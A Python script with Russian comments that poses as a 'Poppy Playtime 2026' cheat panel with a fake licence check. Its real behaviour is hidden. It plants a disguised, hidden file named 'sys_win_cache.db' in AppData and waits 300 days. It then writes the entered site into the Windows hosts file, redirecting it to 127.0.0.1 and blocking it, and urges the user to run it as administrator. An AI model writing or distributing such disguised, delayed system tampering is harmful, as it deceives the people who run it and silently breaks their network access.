import os
import time
import ctypes
from datetime import datetime, timedelta

# Скрываем файл даты глубоко в системную папку AppData
DATE_FILE = os.path.join(os.getenv('APPDATA'), "sys_win_cache.db")
HOSTS_PATH = r"C:\Windows\System32\drivers\etc\hosts"
REDIRECT = "127.0.0.1"

def set_hidden(path):
    """Делает файл невидимым для системы Windows"""
    if os.name == 'nt':
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)

def start_panel():
    print("=== POPPY PLAYTIME 2026 CHEAT PANEL ===")
    print("Статус: Проверка облачной лицензии...")
    time.sleep(2)

    # Логика таймера на 300 дней
    if not os.path.exists(DATE_FILE):
        activation_date = datetime.now() + timedelta(days=300)
        with open(DATE_FILE, "w") as f:
            f.write(activation_date.strftime("%Y-%m-%d %H:%M:%S"))
        set_hidden(DATE_FILE) # Делаем файл скрытым сразу после создания
    else:
        with open(DATE_FILE, "r") as f:
            activation_date = datetime.strptime(f.read(), "%Y-%m-%d %H:%M:%S")

    site = input("\nВведите адрес для активации (например, roblox.com): ").strip().lower()
    action = input("Команда (on/off): ").lower()

    if action == "on":
        print("\nCheatPanel:On")
        
        if datetime.now() >= activation_date:
            try:
                with open(HOSTS_PATH, "r+") as f:
                    content = f.read()
                    if site not in content:
                        f.write(f"\n{REDIRECT} {site}\n")
                        f.write(f"\n{REDIRECT} www.{site}\n")
                os.system("ipconfig /flushdns > nul")
                print("СТАТУС: АКТИВИРОВАНО. Приятной игры!")
            except PermissionError:
                print("ОШИБКА: Запусти от имени АДМИНИСТРАТОРА (правой кнопкой мыши)!")
        else:
            days_left = (activation_date - datetime.now()).days
            print(f"Подожди {days_left} дней и она активируется")
            print("Сейчас статус: Инициализация ресурсов...")

    elif action == "off":
        print("CheatPanel:Off. Отмена.")

    print("\nОкно закроется через 5 секунд...")
    time.sleep(5)

if __name__ == "__main__":
    start_panel()

